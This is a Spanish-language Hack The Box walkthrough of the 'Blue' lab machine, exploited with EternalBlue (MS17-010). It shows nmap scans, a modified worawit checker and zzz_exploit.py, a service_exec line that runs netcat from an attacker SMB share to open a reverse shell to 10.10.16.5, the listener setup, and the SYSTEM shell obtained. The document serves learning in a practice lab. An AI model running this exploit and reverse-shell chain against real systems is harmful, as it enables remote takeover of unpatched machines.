---
layout: single
title: <span style="color:#4dd1ff;">Blue </span><span class="htb"><span class="en_blanco">-</span> Hack The Box <span class="en_blanco">-</span> </span><span class="es_rojo">E</span><span class="es_amarillo">S</span><span class="es_rojo">P</span>
excerpt: "En este post veremos como explotar la máquina Blue con la famosa herramienta de la NSA EternalBlue, la cual explota el SMBv1 CVE-2017-0144. Tenía ganas de explotar esta vulnerabilidad por la
historia que tiene y ver el nivel de criticidad de la misma, ya que obtienes los máximos privilegios posibles de forma remota."
date: 2022-08-05
classes: wide
header:
  teaser: /assets/images/Blue/Blue.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Easy
  - Esp
tags: 
  - Nmap
  - Eternalblue
  - Ms17-10
  - Smb
  - CVE-2017-0144
---

## DESCRIPCION
 
En este post veremos como explotar la máquina Blue con la famosa herramienta de la NSA EternalBlue, la cual explota el SMBv1 CVE-2017-0144. Tenía ganas de explotar esta vulnerabilidad por la 
historia que tiene y ver el nivel de criticidad de la misma, ya que obtienes los máximos privilegios posibles de forma remota. 

![](/assets/images/Blue/Descripcion_Blue.png)


## INDICE

- [Reconocimiento de puertos](#escaneo-de-puertos)
- [Explotación con EternalBlue](#explotacion-con-eternalblue)
	- [Repositorio de github](#github)
	- [Comprobar si el target es vulnerable](#checker)
	- [Modificación del script](#script)
- [Flags](#flags)
- [Conocimientos obtenidos](#conocimientos-obtenidos)
- [Errores](#errores)
- [Autores y referencias](#autores-y-referencias)

## ESCANEO DE PUERTOS

Escaneamos con `nmap` los puertos abiertos en la máquina blue:

```zsh
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -oG Puertos 10.10.10.40
   2   │ Host: 10.10.10.40 ()    Status: Up
   3   │ Host: 10.10.10.40 ()    Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///
       │ , 49155/open/tcp//unknown///, 49156/open/tcp//unknown///, 49157/open/tcp//unknown///
   4   │ # Nmap done at Fri Aug  5 01:13:56 2022 -- 1 IP address (1 host up) scanned in 15.60 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ Reconocimiento Puertos

{*} Extrayendo puertos...

        La direccion ip es: 10.10.10.40
        Los puertos abiertos son: 135,139,445,49152,49153,49154,49155,49156,49157

        Los puertos han sido copiados al portapapeles

```
<br>
Escaneamos el objetivo con los scripts predeterminados de nmap en busca de más información.

```ruby
nmap -sCV -O -p135,139,445,49152,49153,49154,49155,49156,49157 -oN Objetivos 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.096s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-12T14:04:49
|_  start_date: 2022-07-12T13:06:26
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-12T15:04:51+01:00
|_clock-skew: mean: -19m54s, deviation: 34m35s, median: 3s

```
Vemos que el SO que corre en la máquina es `Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)` en este momento ya tenemos que pensar en el famoso `EternalBlue`, 
herramienta filtrada de la NSA por el grupo de hackers `Shadow Brokers`. 

Podemos comprobar con nmap si el smb es vulnerable con el siguiente parámetro `--script smb-vuln-ms17-010`.

```ruby
nmap -p445 --script smb-vuln-ms17-010 10.10.10.40 -oN EternalBlueChecker
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-05 01:25 CEST
Nmap scan report for 10.10.10.40
Host is up (0.039s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

```
¡Es vulnerable!


## EXPLOTACION CON ETERNALBLUE

<h3 style="text-align:center;" id="github">REPOSITORIO</h3><br>

Tenemos un repositorio de <a href="https://github.com/worawit/MS17-010" target="_blanck">github</a> donde se encuentran los principales exploits derivados del EternalBlue y dispone de un checker el cual
comprueba si el target es vulnerable.

```txt
.
..
.git
BUG.txt
checker.py
eternalblue_exploit7.py
eternalblue_exploit8.py
eternalblue_poc.py
eternalchampion_leak.py
eternalchampion_poc.py
eternalchampion_poc2.py
eternalromance_leak.py
eternalromance_poc.py
eternalromance_poc2.py
eternalsynergy_leak.py
eternalsynergy_poc.py
infoleak_uninit.py
mysmb.py
mysmb.pyc
npp_control.py
README.md
shellcode
zzz_exploit.py

```
<hr>
<h3 style="text-align:center;" id="checker">CHECKER</h3><br>

Si nos clonamos el repositorio y ejecutamos el checker obtenemos lo siguiente.

```zsh
❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED

```
A primera vista parece que no es vulnerable, pero antes de darnos por vencidos debemos modificar el código añadiendo a la variable `Username` el valor `guest`.

```python
from mysmb import MYSMB
from impacket import smb, smbconnection, nt_errors
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from struct import pack
import sys

'''
Script for
- check target if MS17-010 is patched or not.
- find accessible named pipe
'''

USERNAME = 'guest'
PASSWORD = ''

NDR64Syntax = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')

MSRPC_UUID_BROWSER  = uuidtup_to_bin(('6BFFD098-A112-3610-9833-012892020162','0.0'))
MSRPC_UUID_SPOOLSS  = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB','1.0'))
MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB','1.0'))
MSRPC_UUID_LSARPC   = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AB','0.0'))
MSRPC_UUID_SAMR     = uuidtup_to_bin(('12345778-1234-ABCD-EF00-0123456789AC','1.0'))

```
<br>
Ejecutamos el script.

```
❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)

```
<br>

¡Perfecto! En este momento ya podemos ejecutar el EternalBlue para ganar acceso.
<hr>
<h3 style="text-align:center;" id="script">MODIFICACION DEL SCRIPT</h3><br>

Antes de hacer uso del exploit vamos a modificar el script `zzz_exploit.py` para definir la forma en la que obtendremos una reverse shell.

1- Actualizamos la variable `Username` = `guest`.

```python
#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = 'guest'
PASSWORD = ''

```
<br>
2- Hacemos que la máquina se conecte a nuestro servidor samba donde estamos compartiendo un binario de netcat, el cual ejecutaremos enviándonos una reverse shell.

```python
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        
#       print('creating file c:\\pwned.txt on the target')
#       tid2 = smbConn.connectTree('C$')
#       fid2 = smbConn.createFile(tid2, '/pwned.txt')
#       smbConn.closeFile(tid2, fid2)
#       smbConn.disconnectTree(tid2)

        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c \\10.10.16.5\smbFolder\nc64.exe -e cmd 10.10.16.5 1234')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."

def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
        with open(localSrc, 'rb') as fp:
                smbConn.putFile(remoteDrive + '$', remotePath, fp.read)

```
<br>
3- Usando `impacket-smbserver` nos compartimos el binario de nc.

```zsh
❯ impacket-smbserver smbfolder $(pwd)

```
<br>
4- Nos ponemos por escucha con nc y usando `rlwrap` para obtener una consola más interactiva.

```zsh
rlwrap nc -lvnp 1234 

```
<br>
5- Ejecutamos el script agregando cualquier pipe vulnerable dados en el checker.

```ruby
❯ python2 zzz_exploit.py 10.10.10.40 samr
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa800443b950
SESSION: 0xfffff8a00853c8e0
FLINK: 0xfffff8a003e17088
InParam: 0xfffff8a003df615c
MID: 0x30b
unexpected alignment, diff: 0x20088
leak failed... try again
CONNECTION: 0xfffffa800443b950
SESSION: 0xfffff8a00853c8e0
FLINK: 0xfffff8a001726048
InParam: 0xfffff8a003e2915c
MID: 0x30b
unexpected alignment, diff: 0x-2703fb8
leak failed... try again
CONNECTION: 0xfffffa800443b950
SESSION: 0xfffff8a00853c8e0
FLINK: 0xfffff8a003e3b088
InParam: 0xfffff8a003e3515c
MID: 0x303
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service Zgsk.....
Starting service Zgsk.....
The NETBIOS connection with the remote host timed out.
Removing service Zgsk.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error

```
<br>
6- Comprobamos la correcta obtención de la reverse shell.

```ruby
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.40] 49166
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
nt authority\system

C:\Windows\system32>

```
7- ¡Somos nt authority\system! Perfecto ya podemos visualizar las flags.

## FLAGS

<h3>User.txt</h3>

```

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
05/08/2022  13:16                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,483,068,928 bytes free

type user.txt
efc1xxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
<h3>Root.txt</h3>

```
Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
05/08/2022  13:16                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,483,068,928 bytes free

type root.txt
2fd8xxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
## CONOCIMIENTOS OBTENIDOS

De la máquina <em>Blue</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con Nmap.
- Comprobar vulnerabilidades explotables con Nmap.
- Explotar smb con EternalBlue.
- Desplegar un servidor smb en nuestro equipo.

## ERRORES

Un posible error que podéis sufrir es el siguiente: 
- A la hora de explotar el zzz_exploit.py asegurarse que la variable Username sea igual a guest tal que así `USERNAME = 'guest'`.

## AUTORES y REFERENCIAS

Autor del write up: Luis Miranda Sierra (Void4m0n) <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>. Si queréis contactarme por cualquier motivo lo podéis hacer a través 
de <a href="https://twitter.com/Void4m0n" target="_blank">Twitter</a>.


Autor de la máquina:  <em>ch4p</em>, muchas gracias por la creación de Blue aportando a la comunidad. <a href="https://app.hackthebox.com/users/1" target="_blank">HTB</a>.
